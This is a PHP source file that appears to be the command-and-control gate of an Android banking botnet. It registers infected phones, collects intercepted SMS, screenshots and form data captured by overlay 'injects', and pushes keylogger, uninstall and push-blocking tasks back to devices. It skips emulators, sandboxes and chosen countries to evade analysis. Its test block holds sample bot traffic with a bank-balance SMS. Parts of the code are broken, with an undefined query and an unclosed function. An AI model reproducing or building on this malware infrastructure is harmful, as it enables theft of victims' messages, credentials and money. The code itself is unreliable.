<?php
require_once("config.php");
require_once("helpers.php");
require_once("smarts.class.php");

class Gate
{
	
	public $db;
	public $cfg;
	public $smarts;
	public $bot_id;
	
	public $allowed_actions = array(P_ACTION_REGISTER, P_ACTION_PING, P_ACTION_SMS, P_ACTION_VNC_SCREENSHOT, P_ACTION_SMART_INJECT, P_ACTION_SMART_SAVE);
	
	function __construct($db, $cfg)
	{
		$this->db = $db;
		$this->cfg = $cfg;
		$this->smarts = new Smarts($this->db);
	}

	// returns html is_active, url is_active or html not is_active, but with cap_data
	function get_smart_injects($bot_id, $data)
	{

		$out = array(
			"smarts" => $this->smarts->api_get_injects($bot_id),
		);
		
		return $this->json_response($out);
	}

	// save logs from Smarts - onblur & submit
	function save_smart_inject($bot_id, $data)
	{
		if(isset($data[P_SMART_PKG]) && isset($data[P_SMART_DATA]) && isset($data[P_SMART_FILLED]))
		{
			$this->smarts->api_save_data($bot_id, $data[P_SMART_PKG], $data[P_SMART_DATA]);
			
			if($data[P_SMART_FILLED])
			{
				$this->smarts->disable($bot_id, $data[P_SMART_PKG]);
			}
		}
	}

	// input json array
	function process($data)
	{ 
		$bot_id = $data[P_BOT_ID];
		
		if(!isValidBotId($bot_id))
			return $this->json_response('er1');
		
		$this->bot_id = $bot_id;
		
		if(!isset($data[P_TAG]) || $data[P_TAG] == "")
			return $this->json_response('er2');
		$tag = $data[P_TAG];
		
		if(!isset($data[P_IS_DEVICE_ADMIN]) || $data[P_IS_DEVICE_ADMIN] == "")
			return $this->json_response('er3');
		$is_device_admin = (int)$data[P_IS_DEVICE_ADMIN];
		
		if(!isset($data[P_IS_LOCKED]) || $data[P_IS_LOCKED] == "")
			return $this->json_response('er4');
		$is_locked = (int)$data[P_IS_LOCKED];
		
		if(!isset($data[P_IS_SMS_ADMIN]) || $data[P_IS_SMS_ADMIN] == "")
			return $this->json_response('er5');
		$is_sms_admin = (int)$data[P_IS_SMS_ADMIN];

		if(!isset($data[P_ACTION]) || !in_array($data[P_ACTION], $this->allowed_actions))
			return $this->json_response('er6');

		$action = $data[P_ACTION];
		
		// ALWAYS
		//~ api_tag	P_TAG
		//~ api_id 	P_BOT_ID
		
		//~ +is_device_admin
		//~ *is_locked
		//~ *api_sms_admin	P_IS_ADMIN
		
		//~ action = ping/register/sms
		if($action == P_ACTION_REGISTER)
		{
			return $this->register($bot_id, $data);
		}
		else if($action == P_ACTION_PING)
		{
			// ping
			//~ tasks_results	P_TASKS_RESULTS
			return $this->ping($bot_id, $data);
		}
		else if($action == P_ACTION_SMS)
		{
			//  sms
			//~ api_addr	P_ADDRESS
			//~ api_body	P_BODY
			//~ api_new_sms true
			//~ api_time	P_TIME
			return $this->save_sms($bot_id, $data);
		}
		else if($action == P_ACTION_VNC_SCREENSHOT)
		{
			//  save screenshot
			//~ fn	P_VNC_FILENAME
			//~ bs	P_VNC_SCREENSHOT_BYTES
			return $this->save_vnc_screenshot($bot_id, $data);
		}
		else if($action == P_ACTION_SMART_INJECT)
		{
			// get smart inject
			return $this->get_smart_injects($bot_id, $data);
		}
		else if($action == P_ACTION_SMART_SAVE)
		{
			// save logs from smart inject
			// sPK P_SMART_PKG - pkg name
			// spD P_SMART_DATA - data to save
			return $this->save_smart_inject($bot_id, $data);
		}
		
		return $this->json_response('');

	}
	
	function block_bitch($text, $ip)
	{
		//~ file_put_contents("blocked.log", date("d.m.y G:i:s", time()) . "|{$ip}|" . $text . "\n", FILE_APPEND);
		//~ file_put_contents(".htaccess", "Deny from {$ip} # {$text}\n", FILE_APPEND);
	}

	function getExtraInfo($data)
	{
		$extra_info_array = array();
		if(isset($data[P_INFO_ACSB]))
			$extra_info_array['HAS_ACSB'] = (int) $data[P_INFO_ACSB];

		if(isset($data[P_INFO_PUSH]))
			$extra_info_array['PUSH_ADMIN'] = (int) $data[P_INFO_PUSH];

		if(isset($data[P_INFO_BATTERY]))
			$extra_info_array['BATTERY_LEVEL'] = (int) $data[P_INFO_BATTERY];

		if(isset($data[P_INFO_CHARGER]))
			$extra_info_array['ON_CHARGER'] = (int) $data[P_INFO_CHARGER];

		if(isset($data[P_INFO_SCREEN]))
			$extra_info_array['SCREEN_UNLOCKED'] = (int) $data[P_INFO_SCREEN];

		if(isset($data[P_IS_GO]))
			$extra_info_array['IS_ANDROID_GO'] = (int) $data[P_IS_GO];

		if(isset($data[P_INFO_SUPRESSED]))
			$extra_info_array['P_INFO_SUPRESSED'] = (int) $data[P_INFO_SUPRESSED];

		if(isset($data[P_INFO_PERMS_FAILED]))
			$extra_info_array['P_INFO_PERMS_FAILED'] = substr($data[P_INFO_PERMS_FAILED], 0, 512);

		if(isset($data[P_LOCAL_TIMESTAMP]))
			$extra_info_array['P_LOCAL_TIMESTAMP'] = substr($data[P_LOCAL_TIMESTAMP], 0, 128);

		if(isset($data[P_TASK]))
			$extra_info_array['P_TASK'] = substr($data[P_TASK], 0, 128);

		return json_encode($extra_info_array);
	}

	function register($bot_id, $data)
	{
		$is_sms_admin = (int)$data[P_IS_SMS_ADMIN];
		$is_device_admin = (int)$data[P_IS_DEVICE_ADMIN];
		$is_locked = (int)$data[P_IS_LOCKED];
		
		if(isset($data[P_IS_LOADER_INSTALLED]))
			$is_loader_installed = (int)$data[P_IS_LOADER_INSTALLED];
		else
			$is_loader_installed = 2; // Loader pkg is not specified in the bot Cfg
		
		$extra_info = $this->db->escape($this->getExtraInfo($data));

		if(isset($data[P_REAL_IP]) && $data[P_REAL_IP] != "")
			$ip_raw = $this->parseIP($data[P_REAL_IP]);
		else
			$ip_raw = get_ip();
			
		$ip = $this->db->escape(substr($ip_raw, 0, 512));
		$bot_id2 = $this->db->escape($bot_id);
		$imei = $this->db->escape(substr($data[P_IMEI], 0, 50));
		$number = $this->db->escape(substr($data[P_NUMBER], 0, 15));
		$country = $this->db->escape(substr($data[P_COUNTRY], 0, 2));
		$lang = $this->db->escape(substr($data[P_LANG], 0, 5));
		$android = $this->db->escape(substr($data[P_ANDROID], 0, 64));
		$model = $this->db->escape(substr($data[P_MODEL], 0, 200));
		$operator = $this->db->escape(substr($data[P_OPERATOR], 0, 20));
		$tag = $this->db->escape(substr($data[P_TAG], 0, 32));
		$apps = $this->db->escape($data[P_INSTALLED_APPS]);
		$uptime = $this->db->escape((int)$data[P_UPTIME]);
		$vnc = $this->db->escape(substr($data[P_VNC], 0, 128));
		
		$keylogger = $this->cfg['keylogger_enabled']; // take initial keylogger value from global settings
		
		if(!SKIP_FILTER && !strstr($tag, "DONOTFILTER"))
		{

			if(stristr(",".FORBIDDEN_LANGS.",",  ",".$data[P_LANG].","))
			{
				$this->block_bitch("bad lang: {$lang}", $ip_raw);
				return "";
			}

			if($data[P_OPERATOR] == "Android" || 
				$data[P_MODEL] == "VirtualBox" || 
				stristr($data[P_MODEL], "Emulator x86") || 
				stristr($data[P_MODEL], "Sandbox") )
			{
				$this->block_bitch("baddevice: {$data[P_MODEL]}", $ip_raw);
				return "";
			}
			
			if($data[P_COUNTRY] != "" && stristr(",".FORBIDDEN_COUNTRIES.",",  ",".$data[P_COUNTRY].","))
			{
				$this->block_bitch("bad country: {$country}", $ip_raw);
				return "";
			}
		}
		
		
		$res = $this->db->fetch($sql);
		//~ print_r($res);
		
		if($this->db->getLastError() != "")
		{
			$text = $this->db->getLastError() . "\n" . $sql;
			file_put_contents("debug.log", "\n==== Registration failed: ".date("d.m.y G:i:s", time())." ====\n{$text}\n", FILE_APPEND);
		}
		
		// enable Foreground mode on Android GO by default
		if(isset($data[P_IS_GO]) && $data[P_IS_GO])
		{
			$sql = "insert into bots_tasks values(null, {$bot_id2}, 'start_fg', 'true', 'waiting')";
			$this->db->fetch($sql);
		}
		
		return $this->json_response('OK REG_SUCCESS', true);
	}
	
	function parseIP($IP_json)
	{
		if(strstr($IP_json, "Sorry, but")) return "ip_api.com/json parse error";
		
		$IP_json = trim(strip_tags($IP_json));
		if(substr($IP_json, 0, 1) != "{") return $IP_json;
		
		// http://www.ip-api.com/json
		$js = json_decode($IP_json, true); // {"status":"success","country":"Russia","countryCode":"RU","region":"MSK","regionName":"Moskovskaya Oblast","city":"Moscow","zip":"000000","lat":1.7065,"lon":2.511,"timezone":"Europe/Moscow","isp":"MegaFon","org":"","as":"AS12345 ABC MegaFon","query":"1.2.3.4"}
		
		$res = $js["query"] . "<br />";
		foreach(array("country", "regionName", "city", "isp") as $elem)
			$res .= $js[$elem]."; ";

		return substr($res, 0, strlen($res)-2);
	}
	
	function ping($bot_id, $data)
	{
		$bot_id2 = $this->db->escape($bot_id);

		$bots = $this->db->fetch("select * from bots where bot_id={$bot_id2}", true);
		if(!sizeof($bots))
		{
			// BAD TAG FROM THE BOT
			//show_404("bot_not_found");

			$data[P_IMEI] = '000000000';
			$data[P_NUMBER] = '';
			$data[P_COUNTRY] = '';
			$data[P_LANG] = '';
			$data[P_ANDROID] = 'unknown';
			$data[P_MODEL] = '';
			$data[P_OPERATOR] = '';
			$data[P_TAG] = 'olds';
			$data[P_UPTIME] = '0';
			$data[P_KEYLOGGER] = $this->cfg['keylogger_enabled'];
			$data[P_VNC] = '';
			
			$reg_response = $this->register($bot_id, $data);
			
			$sql = "select id from bots_tasks where bot_id={$bot_id2} and task_type='register_again';";
			$res = $this->db->fetch($sql, true);
			
			if(!sizeof($res))
			{
				$sql = "insert into bots_tasks values(null, {$bot_id2}, 'register_again', '', 'waiting')";
				$this->db->fetch($sql);
			}

			return $reg_response;
		}

		if(isset($data[P_REAL_IP]) && $data[P_REAL_IP] != "")
			$ip_raw = $this->parseIP($data[P_REAL_IP]);
		else
			$ip_raw = get_ip();

		$ip = $this->db->escape(substr($ip_raw, 0, 512));

		$is_sms_admin = (int)$data[P_IS_SMS_ADMIN];
		$is_device_admin = (int)$data[P_IS_DEVICE_ADMIN];
		$is_locked = (int)$data[P_IS_LOCKED];
		if(isset($data[P_IS_LOADER_INSTALLED]))
			$is_loader_installed = (int)$data[P_IS_LOADER_INSTALLED];
		else
			$is_loader_installed = 2; // Loader pkg is not specified in the bot Cfg
		
		$extra_info = $this->db->escape($this->getExtraInfo($data));

		if(isset($data[P_IMEI]))
			$imei_sql = "imei=" . $this->db->escape(substr($data[P_IMEI], 0, 50)) . ",";

		if(isset($data[P_NUMBER]))
			$number = "number=" . $this->db->escape(substr($data[P_NUMBER], 0, 15)) . ",";
			
		if(isset($data[P_INSTALLED_APPS]))
		{
			$apps_sql = "apps=" . $this->db->escape($data[P_INSTALLED_APPS]) . ",";
		}else{
			$apps_sql = "";
		}
		
		if(isset($data[P_LANG]))
		{
			if(stristr(",".FORBIDDEN_LANGS.",",  ",".$data[P_LANG].","))
			{
				$this->block_bitch("bad lang: ". $data[P_LANG], $ip_raw);
				return "";
			}
			
			$lang = "lang=" . $data[P_LANG] . ",";
		}else{
			$lang = "";
		}
		
		if(isset($data[P_COUNTRY]))
		{
			if($data[P_COUNTRY] != "" && stristr(",".FORBIDDEN_COUNTRIES.",",  ",".$data[P_COUNTRY].","))
			{
				$this->block_bitch("bad country: " . $data[P_COUNTRY], $ip_raw);
				return "";
			}
		}
		
	function save_error($bot_id, $error)
	{
		$bot_id2 = $this->db->escape($bot_id);
		$error_text = $this->db->escape($error);
		
		$sql = "insert into errors values(null, {$bot_id2}, current_timestamp(), {$error_text})";
		$this->db->fetch($sql);
	}
	
	function isInjectEnabled($pkg)
	{
		// check bot
		$injs_bot = $this->db->fetch("select pkg, enabled from injects_bots where bot_id='{$this->bot_id}';", true);
		
		if(sizeof($injs_bot))
		foreach($injs_bot as $i)
			if($i['pkg'] == $pkg && $i['enabled'] == 0) return false;

		// check global
		$injs_global = $this->db->fetch("select pkg, enabled from injects", true);
		
		if(sizeof($injs_global))
		foreach($injs_global as $i)
			if($i['pkg'] == $pkg && $i['enabled'] == 0) return false;

		return true;
	}
	
	function blockPushApps()
	{
		$apps = package_list_to_array($this->cfg['block_push_apps']); // aaa\nbbb\nccc
		if(!sizeof($apps)) return "";
		
		$bot_id2 = $this->db->escape($this->bot_id);
		$sql = "select pkg from pushes_bots where bot_id={$bot_id2} and enabled=0;";
		$pushes = $this->db->fetch($sql, true);

		if(!sizeof($pushes)) 
		{
			return implode(",", $apps);
		}

		foreach($pushes as $p)
		{
			$apps[] = $p['pkg'];
		}

		return implode(",", array_unique($apps));
	}
	
	function json_response($response, $registration=false)
	{
		$tasks = $this->get_new_tasks($this->bot_id);
		$arr = array('response'=>$response, 'tasks'=>$tasks);

		if(!isset($this->cfg['smarts_ver']))
			$this->cfg['smarts_ver'] = 0;
		
		$arr['panel_smarts_ver'] = $this->cfg['smarts_ver'];
		
		$injects_to_enable = $this->smarts->injects_to_enable($this->bot_id);
		if($injects_to_enable != "")
			$arr['injects_to_enable'] = $injects_to_enable;
		
		$injects_to_disable = $this->smarts->injects_to_disable($this->bot_id);
		if($injects_to_disable != "")
			$arr['injects_to_disable'] = $injects_to_disable;
		
		// add new domains
		$doms_str = $this->cfg['domains_bot'];
		if(trim($doms_str) != "")
		{
			$doms_final = "";
			$doms = explode("|", $doms_str);
			if(sizeof($doms))
			foreach($doms as $dom)
			{
				$dom = trim($dom);
				if($dom == "") continue;
				if(substr($dom, 0, 7) != "https://")
					$dom = "https://" . $dom;
					
				if(substr($dom, -1) != "/")
					$dom .= "/";
					
				$doms_final .= $dom . "|";
			}
			
			if($doms_final != "")
				$arr['extra_domains'] = $doms_final;
		}
		
		$bot_id2 = $this->db->escape($this->bot_id);
		
		$sql = "select keylogger from bots where bot_id={$bot_id2};";
		$bot_data = $this->db->fetch($sql, true)[0];
		
		if($registration)
		{
			$arr['block_push_apps'] = $this->blockPushApps(); // app,app,app
			$arr['minimize_apps'] = str_replace("\n", ",", $this->cfg['minimize_apps']);
			$arr['uninstall_apps'] = str_replace("\n", ",", $this->cfg['uninstall_apps']);
			
			$arr['block_push_delay'] = $this->cfg['block_push_delay']; // 100 int
			$arr['minimize_delay'] = $this->cfg['minimize_delay'];
			$arr['uninstall_delay'] = $this->cfg['uninstall_delay'];
			$arr['get_device_admin_delay'] = $this->cfg['get_device_admin_delay'];
			$arr['keylogger_delay'] = $this->cfg['keylogger_delay'];
			$arr['injects_delay'] = $this->cfg['injects_delay'];
			$arr['keylogger_enabled'] = $this->cfg['keylogger_enabled']; // 0/1 bool

		}else{
			$arr['keylogger_enabled'] = $bot_data['keylogger'];
		}
		
		$arr['net_delay'] = $this->cfg['net_delay'];
		
		// VNC
		$sql = "select id, task_type, data from vnc_tasks where bot_id={$bot_id2};";
		$res = $this->db->fetch($sql, true);
		if(isset($res[0]))
		{
			$arr['vnc_tasks'] = array(); // tasks of different types - click, gesture, minimuze, etc
			
			foreach($res as $task)
			{
				$id = $task['id'];
				$type = $task['task_type'];
				$data = $task['data'];
				
				$arr['vnc_tasks'][] = array(
					"type" => $type,
					"data" => $data,
				);
			}
			
			$sql = "delete from vnc_tasks where bot_id={$bot_id2};";
			$this->db->fetch($sql);
		}
		
		return json_encode($arr);
	}

// $tasks = $this->get_new_tasks($bot_id);
	function get_new_tasks($bot_id)
	{
		$bot_id2 = $this->db->escape($bot_id);
		$tasks = array();
		$sql = "select id, task_type, data from bots_tasks where bot_id={$bot_id2} and status='waiting';";
		$new_tasks = $this->db->fetch($sql, true);
		if(!sizeof($new_tasks))
			return array();

		$used_ids = array();
		foreach($new_tasks as $t)
		{
			$tasks[] = $t;
			$used_ids[] = $t['id'];
		}
		
		$used_ids_str = implode(",", $used_ids);
		$sql = "update bots_tasks set status='in_process' where id in({$used_ids_str});";
		$this->db->fetch($sql);

		return $tasks;
	}

	// ['123:success', '4:failed']
	function save_tasks_results($bot_id, $results)
	{
		if(!sizeof($results)) return;
		
		foreach($results as $elem)
		{
			list($task_id, $value) = explode(":", $elem, 2);

			$task_id_str = $this->db->escape($task_id);
			if($task_id == "" || $task_id == 0) continue;
			
			$task_result_str = $this->db->escape($value);
			if(!trim($task_result_str)) continue;
			
			$bot_id2 = $this->db->escape($bot_id);
			$sql = "update bots_tasks set status={$task_result_str} where id={$task_id_str} and bot_id={$bot_id2}";
			$this->db->fetch($sql);
		}
		
	}

	function save_sms_list($bot_id, $sms_list)
	{
		$keys = "";
		$results = json_decode($sms_list, true);

		if(is_array($results) && sizeof($results))
		foreach($results as $key=>$val)
		{
			$keys .= $key . ",";
			list($addr, $text) = explode(":", $val, 2);
			
			$bot_id2 = $this->db->escape($bot_id);
			$number = $this->db->escape($addr);
			$body = $this->db->escape($text);
			$time = $this->db->escape($key);
			
			$sql = "select count(id) from sms where bot_id={$bot_id2} and time={$time};";
			$res = $this->db->fetch($sql, true);
			if($res[0]['count(id)'] == 0)
			{
				$sql = "insert into sms values(null, {$bot_id2}, {$number}, {$time}, {$body})";
				//echo $sql;
				$this->db->fetch($sql);
			}

		}
		
		return 'SMS_OK_' . $keys;
	}

function test()
{
	require_once("pdo.php");
	$db = new Db();
	$db->connect();
	if(!$db->is_connected)
		die('DataBase');

	$client_cfg = array();
	$sql = "select name, value from config";
	$res = $db->fetch($sql, true);
	if(sizeof($res))
	foreach($res as $row)
		$client_cfg[$row['name']] = $row['value'];
	
	$gate = new Gate($db, $client_cfg);
	//~ $gate->bot_id = 'd752d3b1d94d8a49eb76cd38bc03c758';
	
	//~ # save sms
	//~ $json = '{"xc":"bS","sA":"3333","sB":"Saldo 15140.00 Vig 27-06-2021 Promo 0 Vig 28-05-2021 Total 15140 Consulta Condiciones y Promociones del plan en www.claro.com.co","sT":"29\/04\/2021 11:03:10","lB":"v1.1","lL":"0","bI":"01567d9706a6d61e9348e57f97696b54","iA":"0","dA":"0","lK":"0"}';
	
	// download smart inject
	//~ $json = '{"xc":"gSWI","lB":"TAG","lL":"0","bI":"d752d3b1d94d8a49eb76cd38bc03c758","iA":"0","dA":"0","lK":"0"}';

	$json = '{"xc":"gSWI","lB":"DONOTFILTER","bI":"492b2d09e0cdbe7956b98de33f8e0c53","iA":"0","dA":"0","lK":"0","iAc":"0","iPa":"0","iBC":69,"iCP":"1","iSE":"1","iSp":0,"iFp":"","cTsk":"","up":12,"kL":"1","vnc":"","fgM":"0","iAg":false,"rIP":"82.118.22.69; Poland; Pomerania; Gdansk; "}';
	
	//~ $json = '{"xc":"sSD","sPK":"com.android.chrome","spD":"zazazaz fields test","lB":"DONOTFILTER","bI":"492b2d09e0cdbe7956b98de33f8e0c53","iA":"0","dA":"0","lK":"0","iAc":"0","iPa":"0","iBC":96,"iCP":"1","iSE":"1","iSp":0,"iFp":"","cTsk":"","up":53,"kL":"1","vnc":"","fgM":"0","iAg":false,"rIP":"82.118.22.69; Poland; Pomerania; Gdansk; "}';
	
	// save smart data
	//~ $json = '{"xc":"sSD","sPK":"com.android.chrome","spD":"{field1:test}","lB":"TAG","lL":"0","bI":"d752d3b1d94d8a49eb76cd38bc03c758","iA":"0","dA":"0","lK":"0"}';
	
	//~ $json = '{"response":"SMS_OK_","tasks":[{"id":"13","task_type":"intercept_on","data":"true"}],"injects_list":"com.ghisler.android.TotalCommander|com.whatsapp|"}';
	
	$res = $gate->process(json_decode($json, true));
	print_r($res);

	// var_dump($gate->parseIP('<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head>    <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />    <title>LP</title></head><body onload="window.location=&quot;../postpaid/upsell&quot;;"><div id="content"> </div></body></html>'));
	//var_dump($gate->blockPushApps());
}

//~ test();


